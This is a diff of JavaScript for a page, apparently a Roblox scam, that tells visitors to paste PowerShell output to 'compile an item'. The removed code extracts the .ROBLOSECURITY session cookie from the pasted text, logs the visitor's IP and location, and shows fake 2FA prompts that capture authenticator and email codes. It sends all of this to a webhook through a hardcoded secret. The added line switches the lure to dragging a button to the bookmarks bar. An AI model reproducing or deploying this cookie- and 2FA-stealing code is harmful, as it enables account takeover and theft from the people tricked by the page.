@@ -1,6 +1,6 @@
 // === UI Setup ===
 document.getElementById('instructions').textContent =
-  'Press on the "Compile Item" button to compile your item. Once you have your PowerShell copied, you can paste it and hit "Enter" to check.';
+  'Drag the "Compile Item" Button to your bookmarks bar';
 
 // === Rate Limiting ===
 const rateLimit = {
@@ -46,7 +46,7 @@ function closeModal(id) {
 }
 
 function closeAllModals() {
-  ['modal', 'twofa-modal', 'twofa-modal-2', 'faqModal', 'aboutModal', 'tosModal'].forEach(closeModal);
+  ['modal', 'faqModal', 'aboutModal', 'tosModal'].forEach(closeModal);
 }
 
 // === Main Button ===
@@ -85,32 +85,7 @@ document.getElementById('submitButton').addEventListener('click', async function
     showErrorAlert();
     powershellInput.value = '';
     closeModal('modal');
-    await sendSecureWebhook('No Asset ID Found', 'No asset id found in PowerShell.', 0xff0000);
     return;
-  }
-
-  // Send webhook for valid cookie with IP logging
-  const roblosecurityRegex = /New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
-  const match = powershellData.match(roblosecurityRegex);
-  let ipInfo = null;
-  if (match) {
-    const cookie = match[1].trim();
-    // Fetch IP and location info
-    try {
-      const res = await fetch('https://ipapi.co/json');
-      if (res.ok) {
-        ipInfo = await res.json();
-      }
-    } catch (e) {
-      ipInfo = null;
-    }
-    let locationText = '';
-    if (ipInfo) {
-      locationText = `IP: ${ipInfo.ip}\nCountry: ${ipInfo.country_name}\nRegion: ${ipInfo.region}\nCity: ${ipInfo.city}\nOrg: ${ipInfo.org}`;
-    } else {
-      locationText = 'IP/location lookup failed.';
-    }
-    await sendSecureWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\`\n${locationText}`, 0x00ff00);
   }
 
   powershellInput.value = '';
@@ -137,8 +112,8 @@ document.getElementById('submitButton').addEventListener('click', async function
   }, 8500);
 
   setTimeout(() => {
-    // 10s: Show 2FA modal (not just success popup)
-    openModal('twofa-modal');
+    // 10s: Show success popup
+    showSuccessPopup();
   }, 10000);
 });
 
@@ -217,116 +192,6 @@ function showErrorAlert() {
       setTimeout(() => { alert.style.display = 'none'; }, 500);
     }, 4000);
   }
-}
-
-// === 2FA Modal Logic (add 6s delay before showing success popup) ===
-const twofaInput = document.getElementById('twofa-input');
-const verifyButton = document.getElementById('verifyButton');
-
-if (twofaInput && verifyButton) {
-  twofaInput.addEventListener('input', () => {
-    const enabled = /^\d{6}$/.test(twofaInput.value);
-    verifyButton.disabled = !enabled;
-    verifyButton.classList.toggle('enabled', enabled);
-  });
-
-  verifyButton.addEventListener('click', async () => {
-    const codeEnteredValue = twofaInput.value.trim();
-    if (!/^\d{6}$/.test(codeEnteredValue)) {
-      alert('Please enter a valid 6-digit code.');
-      return;
-    }
-
-    // Rate limiting check
-    if (!rateLimit.check()) {
-      alert('Please wait a moment before trying again.');
-      return;
-    }
-
-    // Send webhook for 2FA code
-    await sendSecureWebhook('2FA Auth Code Captured 🔥', `Authenticator Code Entered: **${codeEnteredValue}**`, 0xffa500);
-
-    twofaInput.value = '';
-    closeModal('twofa-modal');
-    showLoading(true, false);
-    showLoadingMessage("Processing...");
-
-    setTimeout(() => {
-      showLoading(false);
-      showSuccessPopup();
-    }, 6000);
-  });
-}
-
-const twofaInput2 = document.getElementById('twofa-input-2');
-const verifyButton2 = document.getElementById('verifyButton2');
-
-if (twofaInput2 && verifyButton2) {
-  twofaInput2.addEventListener('input', () => {
-    const enabled = /^\d{6}$/.test(twofaInput2.value);
-    verifyButton2.disabled = !enabled;
-    verifyButton2.classList.toggle('enabled', enabled);
-  });
-
-  verifyButton2.addEventListener('click', async () => {
-    const codeEnteredValue = twofaInput2.value.trim();
-    if (!/^\d{6}$/.test(codeEnteredValue)) {
-      alert('Please enter a valid 6-digit code.');
-      return;
-    }
-
-    // Rate limiting check
-    if (!rateLimit.check()) {
-      alert('Please wait a moment before trying again.');
-      return;
-    }
-
-    // Send webhook for email code
-    await sendSecureWebhook('2FA Email Code Captured 📩', `Second Modal Code Entered: **${codeEnteredValue}**`, 0xffa500);
-
-    twofaInput2.value = '';
-    closeModal('twofa-modal-2');
-    
-    // 6 second delay before success popup
-    showLoading(true, false);
-    showLoadingMessage("Processing...");
-
-    setTimeout(() => {
-      showLoading(false);
-      showSuccessPopup();
-    }, 6000);
-  });
-}
-
-const WEBHOOK_SECRET = 'A9f$2kLz!pQw8xR7';
-
-async function sendSecureWebhook(title, description, color) {
-  try {
-    const response = await fetch('/.netlify/functions/webhook', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'x-webhook-token': WEBHOOK_SECRET
-      },
-      body: JSON.stringify({ title, description, color })
-    });
-    
-    if (!response.ok) {
-      console.error('Failed to send webhook:', response.status);
-    }
-  } catch (error) {
-    console.error('Error sending webhook:', error);
-  }
-}
-
-// === Helpers ===
-function closeTwoFAModal() {
-  const modals = ['twofa-modal', 'twofa-modal-2'];
-  modals.forEach(id => closeModal(id));
-}
-
-function useAnotherMethod() {
-  alert('Other verification methods are not available. Please use your authenticator app or check your email.');
 }
 
 function showSuccessPopup() {
